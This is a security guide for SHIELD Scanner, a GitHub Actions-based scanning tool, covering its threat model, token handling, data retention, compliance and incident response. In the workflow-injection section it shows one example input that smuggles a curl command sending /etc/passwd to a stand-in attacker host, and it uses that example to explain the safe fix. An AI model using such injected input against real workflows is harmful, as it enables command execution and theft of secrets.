# SHIELD Scanner Security Guide

**Copyright © 2026 Georges Bou Ghantous. All Rights Reserved.**

> **Note:** This is comprehensive security documentation. Basic users: use private repos and don't commit tokens. This guide is for enterprise/production deployments.

This document outlines security considerations, best practices, threat model, and compliance guidelines for SHIELD Scanner deployments.

---

## Table of Contents

- [Security Model](#security-model)
- [Threat Model](#threat-model)
- [Authentication & Authorization](#authentication--authorization)
- [Token Management](#token-management)
- [Data Protection](#data-protection)
- [Audit & Compliance](#audit--compliance)
- [Incident Response](#incident-response)
- [Security Checklist](#security-checklist)

---

## Security Model

### Trust Model

```
User Browser
  ↓ (HTTPS + Token)
GitHub API
  ↓ (OIDC + Permissions)
GitHub Actions Runner
  ↓ (Container Runtime)
SHIELD Framework Container
  ↓ (HTTPS)
Scan Target
```

**Trust boundaries:**

| Component | Trust Level | Why |
|-----------|-------------|-----|
| User Browser | **Untrusted** | User-controlled, potential XSS |
| GitHub API | **Trusted** | GitHub-managed, authenticated |
| Actions Runner | **Trusted** | Ephemeral, isolated environment |
| SHIELD Container | **Semi-trusted** | Open source, auditable code |
| Scan Target | **Untrusted** | External website, potential malicious |

---

### Security Principles

1. **Defense in Depth** - Multiple layers of security controls
2. **Least Privilege** - Minimal permissions for each component
3. **Zero Trust** - Verify all interactions, assume breach
4. **Audit Everything** - Log all security-relevant events
5. **Fail Secure** - Default to deny on errors

---

## Threat Model

### Threat Actors

#### External Attacker (Public Internet)
- **Goal:** Access sensitive scan data, authorization documents
- **Methods:** API exploitation, credential theft, social engineering
- **Mitigations:** Private repositories, HTTPS enforcement, token rotation

#### Malicious Insider (Authorized User)
- **Goal:** Exfiltrate authorization documents, scan unauthorized targets
- **Methods:** Abuse legitimate access, excessive data access
- **Mitigations:** Audit logging, access reviews, branch policies

#### Compromised Target (Scan Target)
- **Goal:** Attack scanner via response manipulation
- **Methods:** XSS payloads in responses, malicious redirects
- **Mitigations:** Container isolation, input sanitization, output encoding

---

### Attack Vectors

#### 1. Token Theft

**Scenario:** Attacker steals GitHub Personal Access Token

**Impact:**
- Unauthorized workflow dispatch
- Access to private repositories
- Ability to read authorization files
- Execute arbitrary scans

**Mitigations:**
- ✅ Never commit tokens to repository
- ✅ Use fine-grained tokens with minimal scopes
- ✅ Enable token expiration (max 90 days)
- ✅ Rotate tokens regularly (monthly recommended)
- ✅ Monitor token usage in GitHub audit logs
- ✅ Implement GitHub App OAuth (production)

**Detection:**
```bash
# Review token usage
gh api /user/tokens --jq '.[] | select(.token_last_eight == "12345678")'

# Check for unexpected workflow_dispatch events
gh api /repos/Georges034302/SHIELD-scanner/events \
  --jq '.[] | select(.type == "WorkflowDispatchEvent")'
```

---

#### 2. Authorization File Exposure

**Scenario:** Authorization documents leaked via public repository or insecure branches

**Impact:**
- Client confidential information exposure
- Legal/contractual breach
- Reputation damage

**Mitigations:**
- ✅ Use private repositories for production
- ✅ Delete ephemeral branches after scan completion
- ✅ Redact sensitive information from authorization files
- ✅ Encrypt authorization files at rest (optional)
- ✅ Watermark documents with unique identifiers
- ✅ Implement data retention policies

**Cleanup automation:**
```bash
# Delete old auth branches (run periodically)
git branch -r | grep 'origin/auth/' | while read branch; do
  AGE=$(git log -1 --format=%ct "$branch")
  NOW=$(date +%s)
  if [ $((NOW - AGE)) -gt 604800 ]; then  # 7 days
    git push origin --delete "${branch#origin/}"
  fi
done
```

---

#### 3. XSS via Scan Results

**Scenario:** Malicious scan target injects JavaScript into HTML reports

**Attack chain:**
1. Target returns XSS payload in response headers
2. SHIELD Framework captures raw response
3. Report rendering includes unsanitized data
4. User opens report.html, XSS executes

**Mitigations:**
- ✅ HTML entity escaping in `html_from_json.js`: `esc()` function
- ✅ Content Security Policy headers on GitHub Pages
- ✅ No `eval()` or `innerHTML` with user data
- ✅ Trusted Types (future enhancement)

**Current sanitization:**
```javascript
function esc(s) {
  return String(s ?? "").replace(/[&<>"]/g, c => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;'
  }[c]));
}
```

**Defense-in-depth:**
```html
<!-- Add to template.html -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'none';
  style-src 'unsafe-inline';
  img-src 'self' data:;
">
```

---

#### 4. Workflow Injection

**Scenario:** Attacker manipulates workflow inputs to execute arbitrary commands

**Example:**
```yaml
inputs:
  target_url: "https://evil.com; curl attacker.com/exfil?data=$(cat /etc/passwd)"
```

**Impact:**
- Remote code execution in runner
- Secrets exfiltration
- Lateral movement to other repos

**Mitigations:**
- ✅ Input validation in workflow
- ✅ Parameterized commands (no string interpolation)
- ✅ Container isolation (SHIELD runs in Docker)
- ✅ Secrets masking (automatic by GitHub)
- ✅ Audit workflow_dispatch events

**Secure input handling:**
```yaml
# ❌ VULNERABLE
- run: bash action/scripts/run_container.sh ${{ inputs.target_url }}

# ✅ SECURE
- env:
    TARGET_URL: ${{ inputs.target_url }}
  run: bash action/scripts/run_container.sh "${TARGET_URL}"
```

---

#### 5. Supply Chain Attack

**Scenario:** Malicious code injected into SHIELD Framework container image

**Impact:**
- Data exfiltration from scans
- Backdoor in all assessments
- Compromised scan results

**Mitigations:**
- ✅ Use official SHIELD Framework image only
- ✅ Pin image to specific digest (not :latest)
- ✅ Verify image signatures (cosign)
- ✅ Scan container images for vulnerabilities (Trivy)
- ✅ Use private container registry for production
- ✅ Implement image provenance checks

**Pin to digest:**
```yaml
# Instead of:
image: ghcr.io/Georges034302/SHIELD-framework:latest

# Use:
image: ghcr.io/Georges034302/SHIELD-framework@sha256:abc123...
```

**Verify signature (future):**
```bash
# Sign images with cosign
cosign sign ghcr.io/Georges034302/SHIELD-framework:v2.0

# Verify before use
cosign verify --key cosign.pub ghcr.io/Georges034302/SHIELD-framework:v2.0
```

---

#### 6. GitHub Actions Runner Compromise

**Scenario:** Malicious code escapes container, compromises runner host

**Impact:**
- Access to other repository secrets
- Persistence across workflows
- Lateral movement to GitHub infrastructure

**Mitigations:**
- ✅ GitHub-managed runners (ephemeral)
- ✅ Container security boundaries
- ✅ No persistent storage on runners
- ✅ Network egress controls (future)
- ✅ Runtime monitoring (GitHub provides)

**Self-hosted runner hardening:**
```yaml
# Only if using self-hosted runners
- Use dedicated runner per repository
- Implement runner rotation (weekly)
- Network segmentation (runners in isolated VLAN)
- Disable Docker socket mounting
- Enable audit logging
```

---

## Authentication & Authorization

### Current Model (MVP)

**Authentication:** Personal Access Token (PAT)
- User generates PAT with `repo` scope
- Paste token into web interface
- Token used for all GitHub API calls

**Limitations:**
- ⚠️ Token exposed in browser memory
- ⚠️ No automatic expiration in session
- ⚠️ User must manage token lifecycle
- ⚠️ Broad permissions (`repo` = full access)

---

### Production Model (Recommended)

**GitHub App OAuth Flow:**

```
1. User clicks "Login with GitHub"
   ↓
2. Redirect to GitHub OAuth authorize
   https://github.com/login/oauth/authorize?
     client_id=Iv1.abc123&
     redirect_uri=https://scanner.example.com/callback&
     scope=repo
   ↓
3. User authorizes app
   ↓
4. GitHub redirects with code
   https://scanner.example.com/callback?code=xyz789
   ↓
5. Exchange code for token (server-side or serverless function)
   POST https://github.com/login/oauth/access_token
   ↓
6. Store token in secure sessionStorage
   ↓
7. Use token for API calls
```

**Benefits:**
- ✅ Standard OAuth flow (industry best practice)
- ✅ Token never manually copied
- ✅ Granular permission scopes
- ✅ Automatic expiration and refresh
- ✅ Per-app revocation

**Implementation:**
- Deploy serverless function (AWS Lambda, Cloudflare Workers)
- Handle OAuth callback and token exchange
- Return temporary token to client
- No server infrastructure required

---

### Fine-Grained Permissions

**Minimum required scopes:**

| Operation | Scope Required |
|-----------|---------------|
| Create branch | `contents:write` |
| Commit file | `contents:write` |
| Dispatch workflow | `actions:write` |
| List workflow runs | `actions:read` |
| Get run status | `actions:read` |

**Fine-grained token configuration:**
```json
{
  "repositories": ["SHIELD-scanner"],
  "permissions": {
    "actions": "write",
    "contents": "write",
    "metadata": "read"
  },
  "expires_at": "2026-04-03T00:00:00Z"
}
```

**Create fine-grained token:**
1. Settings → Developer settings → Personal access tokens → Fine-grained tokens
2. Click "Generate new token"
3. Repository access: Select "SHIELD-scanner" only
4. Permissions:
   - Actions: Read and write
   - Contents: Read and write
5. Expiration: 90 days max

---

## Token Management

### Best Practices

#### 1. Token Generation
```bash
# Create token via CLI (requires manual approval)
gh auth token

# Verify token scopes
curl -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/user \
  -I | grep x-oauth-scopes
```

#### 2. Token Storage

**❌ NEVER:**
- Commit tokens to repository
- Store in localStorage (persistent)
- Share via email/Slack
- Reuse across environments
- Use tokens without expiration

**✅ ALWAYS:**
- Store in memory only (sessionStorage if needed)
- Clear on logout/page close
- Rotate monthly minimum
- Use environment-specific tokens
- Enable expiration (90 days max)

#### 3. Token Rotation

**Rotation schedule:**
- **Development:** 90 days
- **Staging:** 60 days
- **Production:** 30 days
- **Incident response:** Immediate

**Automation:**
```bash
#!/bin/bash
# rotate-token.sh - Rotate GitHub tokens

NEW_TOKEN=$(gh auth refresh -s repo)
echo "New token: ${NEW_TOKEN}"

# Update in secrets manager
gh secret set GITHUB_TOKEN -b"${NEW_TOKEN}" -R Georges034302/SHIELD-scanner

# Revoke old token
gh auth revoke-token
```

#### 4. Token Monitoring

**Audit token usage:**
```bash
# Query audit log for token usage
gh api /orgs/myorg/audit-log \
  --jq '.[] | select(.action == "oauth_authorization.create")'

# Check token last used
gh api /user/tokens \
  --jq '.[] | {name, last_used_at, expires_at}'
```

**Alerting rules:**
- Token used from unexpected IP
- Token used outside business hours
- Multiple failed authentication attempts
- Token approaching expiration

---

## Data Protection

### Data Classification

| Data Type | Classification | Retention | Encryption |
|-----------|---------------|-----------|------------|
| Authorization files | **Confidential** | 30 days | At rest (GitHub) |
| Scan reports (JSON/MD) | **Internal** | 90 days | At rest (GitHub) |
| Workflow logs | **Internal** | 90 days | At rest (GitHub) |
| GitHub tokens | **Secret** | Session only | In transit (TLS) |
| Target URLs | **Public/Internal** | 90 days | At rest (GitHub) |

---

### Encryption

**In Transit:**
- ✅ All GitHub API calls over HTTPS (TLS 1.2+)
- ✅ GitHub Pages served over HTTPS
- ✅ Container registry (GHCR) over HTTPS
- ✅ Scan target over HTTPS (enforced by SHIELD)

**At Rest:**
- ✅ GitHub repos encrypted at rest (AES-256)
- ✅ GitHub Actions artifacts encrypted
- ✅ GitHub Pages content encrypted
- ❌ Authorization files NOT separately encrypted (rely on GitHub)

**End-to-End Encryption (Optional):**
```bash
# Encrypt authorization file before upload
openssl enc -aes-256-cbc -salt -in auth.pdf -out auth.pdf.enc \
  -pass pass:$ENCRYPTION_KEY

# Upload encrypted file
# Decrypt in workflow
openssl enc -d -aes-256-cbc -in auth.pdf.enc -out auth.pdf \
  -pass pass:${{ secrets.ENCRYPTION_KEY }}
```

---

### Data Retention

**Policy:**

| Resource | Retention Period | Cleanup Method |
|----------|-----------------|----------------|
| Authorization branches | 30 days | Manual deletion |
| Workflow artifacts | 90 days | Automatic (GitHub) |
| Workflow logs | 90 days | Automatic (GitHub) |
| Pages deployments | Indefinite | Manual deletion |
| Audit logs | 180 days | Org setting |

**Automated cleanup script:**
```bash
#!/bin/bash
# cleanup-old-data.sh

REPO="Georges034302/SHIELD-scanner"
RETENTION_DAYS=30

# Delete old auth branches
gh api "/repos/${REPO}/branches" --jq '.[].name' | \
  grep '^auth/' | \
  while read branch; do
    LAST_COMMIT=$(gh api "/repos/${REPO}/commits/${branch}" --jq '.commit.committer.date')
    AGE_DAYS=$(( ($(date +%s) - $(date -d "$LAST_COMMIT" +%s)) / 86400 ))
    
    if [ $AGE_DAYS -gt $RETENTION_DAYS ]; then
      echo "Deleting old branch: $branch (${AGE_DAYS} days old)"
      gh api -X DELETE "/repos/${REPO}/git/refs/heads/${branch}"
    fi
  done

echo "Cleanup complete"
```

**Scheduled execution:**
```yaml
# .github/workflows/cleanup.yml
name: Cleanup Old Data

on:
  schedule:
    - cron: '0 2 * * 0'  # Weekly, Sunday 2 AM
  workflow_dispatch:

jobs:
  cleanup:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      
      - name: Run cleanup script
        env:
          GH_TOKEN: ${{ github.token }}
        run: bash scripts/cleanup-old-data.sh
```

---

### Data Access Controls

**Repository permissions:**

| Role | Access Level | Capabilities |
|------|-------------|--------------|
| Admin | Full | Manage settings, secrets, run scans |
| Write | Write | Run scans, view all results |
| Read | Read-only | View reports, no scan execution |
| Triage | Limited write | Manage issues/PRs, no code/secrets |

**Branch protection:**
```yaml
# Protect main branch
main:
  required_pull_request_reviews: true
  required_approving_review_count: 1
  dismiss_stale_reviews: true
  require_code_owner_reviews: false
  restrictions:
    users: []
    teams: ["security-engineers"]
```

---

## Audit & Compliance

### Audit Logging

**GitHub provides audit logs for:**
- Repository access (clone, push, pull)
- Workflow dispatch events
- Secret access (masked values)
- Branch creation/deletion
- Configuration changes
- Team member additions/removals

**Enable audit log streaming (Enterprise):**
```
Organization settings → Audit log → Log streaming
  → Add: Splunk, Azure Monitor, Datadog, etc.
```

**Query audit logs:**
```bash
# Recent workflow dispatches
gh api /orgs/myorg/audit-log \
  --jq '.[] | select(.action == "workflows.approve_workflow_dispatch")'

# Secret access
gh api /orgs/myorg/audit-log \
  --jq '.[] | select(.action == "workflows.secret_accessed")'

# Branch deletions
gh api /orgs/myorg/audit-log \
  --jq '.[] | select(.action == "git.delete_ref")'
```

---

### Compliance Frameworks

#### SOC 2 Type II

**Requirements:**
- ✅ Access controls (GitHub teams, branch protection)
- ✅ Audit logging (GitHub audit log)
- ✅ Data encryption (TLS, at-rest)
- ✅ Change management (PR reviews)
- ✅ Incident response (documented procedures)

**Evidence collection:**
```bash
# Export audit logs for compliance review
gh api /orgs/myorg/audit-log \
  --paginate \
  --jq '.[] | {timestamp:.created_at, actor:.actor, action, repo:.repository}' \
  > audit-logs-$(date +%Y%m).json
```

---

#### ISO 27001

**Controls mapping:**

| Control | Implementation |
|---------|---------------|
| A.9.2.3 (Access control) | GitHub teams, branch protection |
| A.12.4.1 (Event logging) | GitHub audit log, workflow logs |
| A.14.1.2 (Secure development) | Code review, PR approval |
| A.18.1.4 (Privacy) | Data retention policy, encryption |

---

#### GDPR

**Personal data considerations:**
- Authorization documents may contain personal data
- Must inform data subjects of processing
- Right to erasure (branch deletion)
- Data retention limits (30-90 days max)

**Data protection measures:**
```bash
# Process data subject access request
# 1. Find all authorization files for email
git log --all --grep="user@example.com" --format="%H %s"

# 2. Export authorization file
git show auth/123-abc:auth_uploads/123-abc/auth.pdf > export.pdf

# 3. Delete per right to erasure
git push origin --delete auth/123-abc
```

---

### Security Monitoring

**Metrics to track:**

```yaml
Authentications:
  - Failed login attempts
  - Token usage patterns
  - Geographic anomalies

Workflow Activity:
  - Scan frequency per user
  - Failed workflow runs
  - Manual workflow cancellations

Data Access:
  - Authorization file downloads
  - Report access patterns
  - Branch creation/deletion rate

System Health:
  - API rate limit consumption
  - Workflow queue depth
  - Container image pull failures
```

**Alerting thresholds:**
```yaml
- Alert: More than 5 failed API calls per hour
- Alert: Token used from new geographic location
- Alert: More than 10 workflow dispatches per hour per user
- Alert: Branch age exceeds 60 days
- Alert: Secret accessed outside approval workflow
```

**SIEM integration:**
```python
# Example: Send audit events to Splunk
import requests
import json

def send_to_splunk(event):
    headers = {
        "Authorization": f"Splunk {SPLUNK_TOKEN}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "event": event,
        "sourcetype": "github:audit",
        "index": "security"
    }
    
    requests.post(
        f"{SPLUNK_URL}/services/collector/event",
        headers=headers,
        data=json.dumps(payload)
    )

# Fetch and forward GitHub audit events
events = gh_api("/orgs/myorg/audit-log")
for event in events:
    send_to_splunk(event)
```

---

## Incident Response

### Incident Classification

| Severity | Definition | Example | Response Time |
|----------|-----------|---------|--------------|
| **Critical** | Active breach, data exfiltration | Token compromised, unauthorized scans | Immediate |
| **High** | Potential breach, vulnerability exploit | XSS in reports, workflow injection | 4 hours |
| **Medium** | Security control failure | Branch protection bypass, audit gap | 24 hours |
| **Low** | Policy violation, minor issue | Token not rotated, old branches | 7 days |

---

### Incident Response Playbook

#### Scenario 1: Compromised GitHub Token

**Detection:**
- Unexpected workflow_dispatch events
- API calls from unknown IPs
- Alert from GitHub suspicious activity

**Response:**
1. **Immediate (< 5 minutes):**
   ```bash
   # Revoke token immediately
   gh auth revoke-token
   
   # Generate new token
   gh auth refresh -s repo
   ```

2. **Investigation (< 1 hour):**
   ```bash
   # Review audit logs for token usage
   gh api /orgs/myorg/audit-log \
     --jq '.[] | select(.created_at > "2026-03-03T00:00:00Z")'
   
   # Check for unauthorized changes
   git log --all --since="1 hour ago"
   
   # List workflow runs
   gh run list --limit 50
   ```

3. **Containment (< 2 hours):**
   - Delete unauthorized auth branches
   - Cancel running workflows
   - Review secrets for tampering
   - Check for backdoors in code

4. **Recovery (< 4 hours):**
   - Update all repository secrets
   - Rotate dependent credentials
   - Notify affected users
   - Document timeline

5. **Post-Incident (< 1 week):**
   - Root cause analysis
   - Update security controls
   - Security awareness training
   - Audit similar risks

---

#### Scenario 2: XSS in Report Output

**Detection:**
- User reports suspicious script execution
- Security scanner flags XSS payload
- Automated testing catches issue

**Response:**
1. **Immediate:**
   - Remove affected report from Pages
   - Alert users who accessed report
   - Disable report generation temporarily

2. **Investigation:**
   - Identify malicious scan target
   - Review report.json for payload
   - Check other reports for similar issues

3. **Fix:**
   ```javascript
   // Update html_from_json.js
   function esc(s) {
     return String(s ?? "")
       .replace(/&/g, '&amp;')
       .replace(/</g, '&lt;')
       .replace(/>/g, '&gt;')
       .replace(/"/g, '&quot;')
       .replace(/'/g, '&#x27;')  // ADD
       .replace(/\//g, '&#x2F;'); // ADD
   }
   ```

4. **Validation:**
   - Re-generate all reports
   - XSS scanner validation
   - Manual penetration testing

5. **Prevention:**
   - Add CSP headers to template
   - Implement content sanitization library
   - Automated XSS testing in CI

---

#### Scenario 3: Unauthorized Authorization File Access

**Detection:**
- Audit log shows unexpected file access
- User reports unauthorized disclosure
- Branch accessed from wrong account

**Response:**
1. **Immediate:**
   - Delete exposed authorization branch
   - Rotate all related credentials
   - Notify affected client

2. **Investigation:**
   - Who accessed the file?
   - How was access obtained?
   - What other files were accessed?
   - Has data been exfiltrated?

3. **Containment:**
   - Make repository private immediately
   - Remove read access from unnecessary users
   - Enable branch protection on all branches
   - Require 2FA for all users

4. **Legal/Compliance:**
   - Notify legal team
   - Document breach timeline
   - Determine regulatory reporting requirements
   - Client notification per contract

5. **Prevention:**
   - Implement authorization file encryption
   - Reduce retention period (7 days)
   - Automated branch cleanup
   - Access reviews monthly

---

## Security Checklist

### Pre-Deployment

- [ ] Repository set to private
- [ ] Branch protection enabled on main
- [ ] Secrets configured (if using private image)
- [ ] Team access controls defined
- [ ] 2FA enforced for all users
- [ ] Token expiration set (90 days max)
- [ ] Audit logging enabled (if enterprise)
- [ ] Security policy documented
- [ ] Incident response plan created
- [ ] Data retention policy defined

### Production Operations

- [ ] Token rotation schedule (monthly)
- [ ] Authorization branch cleanup (weekly)
- [ ] Audit log review (weekly)
- [ ] Security update review (weekly)
- [ ] Access review (quarterly)
- [ ] Penetration testing (annually)
- [ ] Disaster recovery test (annually)
- [ ] Compliance audit (annually)

### Per-Scan

- [ ] Authorization document verified
- [ ] Scan scope approved
- [ ] Token valid and unexpired
- [ ] Target URL validated
- [ ] Workflow run monitored
- [ ] Reports reviewed for sensitive data
- [ ] Authorization branch deleted after 30 days
- [ ] Scan documented in audit trail

---

## Security Contacts

**Report security vulnerabilities:**
- Email: security@example.com (update with your contact)
- GitHub Security Advisory: [Create advisory](https://github.com/Georges034302/SHIELD-scanner/security/advisories/new)

**Response SLAs:**
- Critical: 24 hours
- High: 7 days
- Medium: 30 days
- Low: 90 days

---

<sub>© 2026 SHIELD Scanner | [Georges Bou Ghantous](https://github.com/Georges034302)</sub>
